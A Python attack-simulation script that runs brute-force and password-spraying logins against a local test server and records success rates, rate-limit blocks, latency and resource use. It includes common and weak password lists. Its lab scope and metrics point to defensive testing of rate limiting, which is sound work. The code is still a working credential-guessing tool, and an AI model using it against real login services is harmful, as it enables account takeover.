#!/usr/bin/env python3
"""
Attack Simulator - Brute-force and Password-spraying simulation
Collects metrics: attempts, time, success rate, latency, CPU/memory usage
"""

import json
import time
import urllib.request
import urllib.error
import psutil
import os
import statistics
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configuration
BASE_URL = "http://127.0.0.1:5000"
LOGIN_ENDPOINT = f"{BASE_URL}/auth/login"

# Common password lists for simulation
COMMON_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345",
    "1234567", "1234567890", "qwerty", "abc123", "111111",
    "monkey", "master", "dragon", "letmein", "login",
    "admin", "welcome", "password1", "p@ssw0rd", "123123",
    "654321", "superman", "qwerty123", "michael", "football",
    "iloveyou", "trustno1", "sunshine", "princess", "starwars"
]

# Weak passwords from our test users
WEAK_PASSWORDS = [
    "123456", "111111", "abcdef", "admin", "654321",
    "qwert", "251891", "yossi", "user", "null"
]


@dataclass
class AttackMetrics:
    """Metrics collected during attack simulation"""
    attack_type: str
    config_name: str
    start_time: str = ""
    end_time: str = ""
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    blocked_attempts: int = 0  # Rate limited (429)
    total_time_seconds: float = 0.0
    attempts_per_second: float = 0.0
    time_to_first_compromise_seconds: Optional[float] = None
    time_to_first_block_seconds: Optional[float] = None
    success_rate_percent: float = 0.0
    block_rate_percent: float = 0.0
    latencies_ms: List[float] = field(default_factory=list)
    avg_latency_ms: float = 0.0
    min_latency_ms: float = 0.0
    max_latency_ms: float = 0.0
    p95_latency_ms: float = 0.0
    cpu_usage_percent: List[float] = field(default_factory=list)
    avg_cpu_percent: float = 0.0
    memory_usage_mb: List[float] = field(default_factory=list)
    avg_memory_mb: float = 0.0
    peak_memory_mb: float = 0.0
    compromised_accounts: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)


class ResourceMonitor:
    """Monitor CPU and memory usage during attack"""
    
    def __init__(self, interval: float = 0.5):
        self.interval = interval
        self.cpu_samples: List[float] = []
        self.memory_samples: List[float] = []
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.process = psutil.Process(os.getpid())
    
    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._monitor, daemon=True)
        self._thread.start()
    
    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=1)
    
    def _monitor(self):
        while self._running:
            self.cpu_samples.append(psutil.cpu_percent(interval=None))
            self.memory_samples.append(self.process.memory_info().rss / 1024 / 1024)
            time.sleep(self.interval)
    
    def get_stats(self):
        return {
            "cpu_samples": self.cpu_samples,
            "memory_samples": self.memory_samples,
            "avg_cpu": statistics.mean(self.cpu_samples) if self.cpu_samples else 0,
            "avg_memory": statistics.mean(self.memory_samples) if self.memory_samples else 0,
            "peak_memory": max(self.memory_samples) if self.memory_samples else 0
        }


def make_login_request(username: str, password: str) -> Dict:
    """Make a single login request and return result with timing"""
    start = time.perf_counter()
    result = {
        "username": username,
        "password": password,
        "success": False,
        "blocked": False,  # Rate limited
        "latency_ms": 0,
        "error": None
    }
    
    try:
        data = json.dumps({"username": username, "password": password}).encode()
        req = urllib.request.Request(
            LOGIN_ENDPOINT,
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                response = json.loads(resp.read().decode())
                result["success"] = "token" in response
        except urllib.error.HTTPError as e:
            response = json.loads(e.read().decode())
            # Rate limited (429)
            if e.code == 429:
                result["blocked"] = True
                result["error"] = "rate_limit_exceeded"
            # TOTP required counts as "found valid credentials"
            elif response.get("totp_required"):
                result["success"] = True
                result["note"] = "totp_required"
    except Exception as e:
        result["error"] = str(e)
    
    result["latency_ms"] = (time.perf_counter() - start) * 1000
    return result


def brute_force_attack(
    target_username: str,
    passwords: List[str],
    config_name: str = "default",
    max_workers: int = 1,
    delay_between_attempts: float = 0
) -> AttackMetrics:
    """
    Brute-force attack: Try many passwords against a single user
    """
    metrics = AttackMetrics(
        attack_type="brute_force",
        config_name=config_name,
        start_time=datetime.utcnow().isoformat()
    )
    
    monitor = ResourceMonitor()
    monitor.start()
    
    start_time = time.perf_counter()
    first_compromise_time = None
    
    print(f"\n🔓 Brute-Force Attack on '{target_username}'")
    print(f"   Config: {config_name}, Workers: {max_workers}, Passwords: {len(passwords)}")
    print("-" * 60)
    
    first_block_time = None
    
    if max_workers == 1:
        # Sequential attack
        for i, password in enumerate(passwords):
            result = make_login_request(target_username, password)
            metrics.total_attempts += 1
            metrics.latencies_ms.append(result["latency_ms"])
            
            if result["blocked"]:
                metrics.blocked_attempts += 1
                if first_block_time is None:
                    first_block_time = time.perf_counter() - start_time
                print(f"   🚫 BLOCKED (rate limited) - attempt {i+1}")
            elif result["success"]:
                metrics.successful_attempts += 1
                metrics.compromised_accounts.append(f"{target_username}:{password}")
                if first_compromise_time is None:
                    first_compromise_time = time.perf_counter() - start_time
                print(f"   ✓ FOUND: {password} (attempt {i+1})")
            else:
                metrics.failed_attempts += 1
            
            if result["error"] and not result["blocked"]:
                metrics.errors.append(result["error"])
            
            if delay_between_attempts > 0:
                time.sleep(delay_between_attempts)
    else:
        # Parallel attack
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(make_login_request, target_username, pwd): pwd 
                for pwd in passwords
            }
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                metrics.total_attempts += 1
                metrics.latencies_ms.append(result["latency_ms"])
                
                if result["blocked"]:
                    metrics.blocked_attempts += 1
                    if first_block_time is None:
                        first_block_time = time.perf_counter() - start_time
                    print(f"   🚫 BLOCKED (rate limited)")
                elif result["success"]:
                    metrics.successful_attempts += 1
                    pwd = futures[future]
                    metrics.compromised_accounts.append(f"{target_username}:{pwd}")
                    if first_compromise_time is None:
                        first_compromise_time = time.perf_counter() - start_time
                    print(f"   ✓ FOUND: {pwd}")
                else:
                    metrics.failed_attempts += 1
                
                if result["error"] and not result["blocked"]:
                    metrics.errors.append(result["error"])
    
    # Finalize metrics
    monitor.stop()
    end_time = time.perf_counter()
    
    metrics.end_time = datetime.utcnow().isoformat()
    metrics.total_time_seconds = end_time - start_time
    metrics.time_to_first_compromise_seconds = first_compromise_time
    metrics.attempts_per_second = metrics.total_attempts / metrics.total_time_seconds if metrics.total_time_seconds > 0 else 0
    metrics.success_rate_percent = (metrics.successful_attempts / metrics.total_attempts * 100) if metrics.total_attempts > 0 else 0
    metrics.block_rate_percent = (metrics.blocked_attempts / metrics.total_attempts * 100) if metrics.total_attempts > 0 else 0
    
    # Latency stats
    if metrics.latencies_ms:
        metrics.avg_latency_ms = statistics.mean(metrics.latencies_ms)
        metrics.min_latency_ms = min(metrics.latencies_ms)
        metrics.max_latency_ms = max(metrics.latencies_ms)
        sorted_latencies = sorted(metrics.latencies_ms)
        p95_idx = int(len(sorted_latencies) * 0.95)
        metrics.p95_latency_ms = sorted_latencies[p95_idx] if sorted_latencies else 0
    
    # Resource stats
    stats = monitor.get_stats()
    metrics.cpu_usage_percent = stats["cpu_samples"]
    metrics.avg_cpu_percent = stats["avg_cpu"]
    metrics.memory_usage_mb = stats["memory_samples"]
    metrics.avg_memory_mb = stats["avg_memory"]
    metrics.peak_memory_mb = stats["peak_memory"]
    
    return metrics


def password_spray_attack(
    usernames: List[str],
    passwords: List[str],
    config_name: str = "default",
    max_workers: int = 1,
    delay_between_attempts: float = 0
) -> AttackMetrics:
    """
    Password-spraying attack: Try each password against all users before moving to next password
    """
    metrics = AttackMetrics(
        attack_type="password_spray",
        config_name=config_name,
        start_time=datetime.utcnow().isoformat()
    )
    
    monitor = ResourceMonitor()
    monitor.start()
    
    start_time = time.perf_counter()
    first_compromise_time = None
    first_block_time = None
    
    print(f"\n🌊 Password-Spray Attack")
    print(f"   Config: {config_name}, Workers: {max_workers}")
    print(f"   Users: {len(usernames)}, Passwords: {len(passwords)}")
    print(f"   Total combinations: {len(usernames) * len(passwords)}")
    print("-" * 60)
    
    # Password spraying: for each password, try all users
    for pwd_idx, password in enumerate(passwords):
        print(f"   Spraying password {pwd_idx + 1}/{len(passwords)}: '{password[:3]}***'")
        
        if max_workers == 1:
            for username in usernames:
                result = make_login_request(username, password)
                metrics.total_attempts += 1
                metrics.latencies_ms.append(result["latency_ms"])
                
                if result["blocked"]:
                    metrics.blocked_attempts += 1
                    if first_block_time is None:
                        first_block_time = time.perf_counter() - start_time
                    print(f"      🚫 BLOCKED: {username}")
                elif result["success"]:
                    metrics.successful_attempts += 1
                    metrics.compromised_accounts.append(f"{username}:{password}")
                    if first_compromise_time is None:
                        first_compromise_time = time.perf_counter() - start_time
                    print(f"      ✓ FOUND: {username}")
                else:
                    metrics.failed_attempts += 1
                
                if result["error"] and not result["blocked"]:
                    metrics.errors.append(result["error"])
                
                if delay_between_attempts > 0:
                    time.sleep(delay_between_attempts)
        else:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {
                    executor.submit(make_login_request, user, password): user 
                    for user in usernames
                }
                
                for future in as_completed(futures):
                    result = future.result()
                    metrics.total_attempts += 1
                    metrics.latencies_ms.append(result["latency_ms"])
                    
                    if result["blocked"]:
                        metrics.blocked_attempts += 1
                        if first_block_time is None:
                            first_block_time = time.perf_counter() - start_time
                        print(f"      🚫 BLOCKED")
                    elif result["success"]:
                        metrics.successful_attempts += 1
                        user = futures[future]
                        metrics.compromised_accounts.append(f"{user}:{password}")
                        if first_compromise_time is None:
                            first_compromise_time = time.perf_counter() - start_time
                        print(f"      ✓ FOUND: {user}")
                    else:
                        metrics.failed_attempts += 1
                    
                    if result["error"] and not result["blocked"]:
                        metrics.errors.append(result["error"])
    
    metrics.time_to_first_block_seconds = first_block_time
    
    # Finalize metrics
    monitor.stop()
    end_time = time.perf_counter()
    
    metrics.end_time = datetime.utcnow().isoformat()
    metrics.total_time_seconds = end_time - start_time
    metrics.time_to_first_compromise_seconds = first_compromise_time
    metrics.attempts_per_second = metrics.total_attempts / metrics.total_time_seconds if metrics.total_time_seconds > 0 else 0
    metrics.success_rate_percent = (metrics.successful_attempts / metrics.total_attempts * 100) if metrics.total_attempts > 0 else 0
    metrics.block_rate_percent = (metrics.blocked_attempts / metrics.total_attempts * 100) if metrics.total_attempts > 0 else 0
    
    # Latency stats
    if metrics.latencies_ms:
        metrics.avg_latency_ms = statistics.mean(metrics.latencies_ms)
        metrics.min_latency_ms = min(metrics.latencies_ms)
        metrics.max_latency_ms = max(metrics.latencies_ms)
        sorted_latencies = sorted(metrics.latencies_ms)
        p95_idx = int(len(sorted_latencies) * 0.95)
        metrics.p95_latency_ms = sorted_latencies[p95_idx] if sorted_latencies else 0
    
    # Resource stats
    stats = monitor.get_stats()
    metrics.cpu_usage_percent = stats["cpu_samples"]
    metrics.avg_cpu_percent = stats["avg_cpu"]
    metrics.memory_usage_mb = stats["memory_samples"]
    metrics.avg_memory_mb = stats["avg_memory"]
    metrics.peak_memory_mb = stats["peak_memory"]
    
    return metrics


def print_metrics_report(metrics: AttackMetrics):
    """Print a formatted metrics report"""
    print("\n" + "=" * 60)
    print(f"📊 ATTACK METRICS REPORT")
    print("=" * 60)
    print(f"Attack Type:     {metrics.attack_type}")
    print(f"Configuration:   {metrics.config_name}")
    print(f"Start Time:      {metrics.start_time}")
    print(f"End Time:        {metrics.end_time}")
    print("-" * 60)
    print("ATTEMPT STATISTICS")
    print(f"  Total Attempts:      {metrics.total_attempts}")
    print(f"  Successful:          {metrics.successful_attempts}")
    print(f"  Failed:              {metrics.failed_attempts}")
    print(f"  Blocked (429):       {metrics.blocked_attempts}")
    print(f"  Success Rate:        {metrics.success_rate_percent:.2f}%")
    print(f"  Block Rate:          {metrics.block_rate_percent:.2f}%")
    print("-" * 60)
    print("TIMING METRICS")
    print(f"  Total Time:          {metrics.total_time_seconds:.2f} seconds")
    print(f"  Attempts/Second:     {metrics.attempts_per_second:.2f}")
    if metrics.time_to_first_compromise_seconds is not None:
        print(f"  Time to Compromise:  {metrics.time_to_first_compromise_seconds:.2f} seconds")
    else:
        print(f"  Time to Compromise:  N/A (no accounts compromised)")
    if metrics.time_to_first_block_seconds is not None:
        print(f"  Time to First Block: {metrics.time_to_first_block_seconds:.2f} seconds")
    print("-" * 60)
    print("LATENCY METRICS")
    print(f"  Average Latency:     {metrics.avg_latency_ms:.2f} ms")
    print(f"  Min Latency:         {metrics.min_latency_ms:.2f} ms")
    print(f"  Max Latency:         {metrics.max_latency_ms:.2f} ms")
    print(f"  P95 Latency:         {metrics.p95_latency_ms:.2f} ms")
    print("-" * 60)
    print("RESOURCE USAGE")
    print(f"  Avg CPU Usage:       {metrics.avg_cpu_percent:.1f}%")
    print(f"  Avg Memory:          {metrics.avg_memory_mb:.1f} MB")
    print(f"  Peak Memory:         {metrics.peak_memory_mb:.1f} MB")
    print("-" * 60)
    if metrics.compromised_accounts:
        print("COMPROMISED ACCOUNTS")
        for account in metrics.compromised_accounts:
            print(f"  🔓 {account}")
    if metrics.blocked_attempts > 0:
        print(f"🛡️  RATE LIMITING: Blocked {metrics.blocked_attempts} attempts ({metrics.block_rate_percent:.1f}%)")
    if metrics.errors:
        print(f"ERRORS: {len(metrics.errors)} errors occurred")
    print("=" * 60)


def save_metrics(metrics: AttackMetrics, filename: str = "attack_metrics.json"):
    """Save metrics to JSON file"""
    # Convert to dict, removing large arrays for readability
    data = asdict(metrics)
    data["latencies_ms"] = f"[{len(metrics.latencies_ms)} samples]"
    data["cpu_usage_percent"] = f"[{len(metrics.cpu_usage_percent)} samples]"
    data["memory_usage_mb"] = f"[{len(metrics.memory_usage_mb)} samples]"
    
    # Append to file
    with open(filename, "a") as f:
        f.write(json.dumps(data, indent=2) + "\n---\n")
    
    print(f"\n📁 Metrics saved to {filename}")


def run_simulation_suite():
    """Run a complete simulation suite with different configurations"""
    
    # Test users
    weak_users = [f"weak{i:02d}" for i in range(1, 11)]
    mid_users = [f"mid{i:02d}" for i in range(1, 11)]
    strong_users = [f"strong{i:02d}" for i in range(1, 11)]
    all_users = weak_users + mid_users + strong_users
    
    results = []
    
    print("\n" + "🚀" * 30)
    print("ATTACK SIMULATION SUITE")
    print("🚀" * 30)
    
    # Simulation 1: Brute-force against weak user (sequential)
    print("\n[1/4] Brute-force attack (sequential)")
    metrics1 = brute_force_attack(
        target_username="weak01",
        passwords=COMMON_PASSWORDS,
        config_name="sequential_no_delay",
        max_workers=1,
        delay_between_attempts=0
    )
    print_metrics_report(metrics1)
    results.append(metrics1)
    
    # Simulation 2: Brute-force against weak user (parallel)
    print("\n[2/4] Brute-force attack (parallel, 5 workers)")
    metrics2 = brute_force_attack(
        target_username="weak02",
        passwords=COMMON_PASSWORDS,
        config_name="parallel_5_workers",
        max_workers=5,
        delay_between_attempts=0
    )
    print_metrics_report(metrics2)
    results.append(metrics2)
    
    # Simulation 3: Password spray (weak passwords against all users)
    print("\n[3/4] Password-spray attack (sequential)")
    metrics3 = password_spray_attack(
        usernames=all_users[:15],  # First 15 users
        passwords=WEAK_PASSWORDS[:5],  # First 5 weak passwords
        config_name="spray_sequential",
        max_workers=1,
        delay_between_attempts=0
    )
    print_metrics_report(metrics3)
    results.append(metrics3)
    
    # Simulation 4: Password spray (parallel)
    print("\n[4/4] Password-spray attack (parallel, 5 workers)")
    metrics4 = password_spray_attack(
        usernames=all_users[:15],
        passwords=WEAK_PASSWORDS[:5],
        config_name="spray_parallel_5_workers",
        max_workers=5,
        delay_between_attempts=0
    )
    print_metrics_report(metrics4)
    results.append(metrics4)
    
    # Save all results
    for metrics in results:
        save_metrics(metrics)
    
    # Summary
    print("\n" + "=" * 80)
    print("📋 SIMULATION SUMMARY")
    print("=" * 80)
    print(f"{'Config':<30} {'Attempts':<10} {'Rate/s':<10} {'Success%':<10} {'Blocked%':<10} {'Compromised':<10}")
    print("-" * 80)
    for m in results:
        print(f"{m.config_name:<30} {m.total_attempts:<10} {m.attempts_per_second:<10.1f} {m.success_rate_percent:<10.1f} {m.block_rate_percent:<10.1f} {len(m.compromised_accounts):<10}")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--suite":
        run_simulation_suite()
    else:
        print("Attack Simulator")
        print("Usage:")
        print("  python attack_simulator.py --suite    Run full simulation suite")
        print("\nOr import and use programmatically:")
        print("  from attack_simulator import brute_force_attack, password_spray_attack")
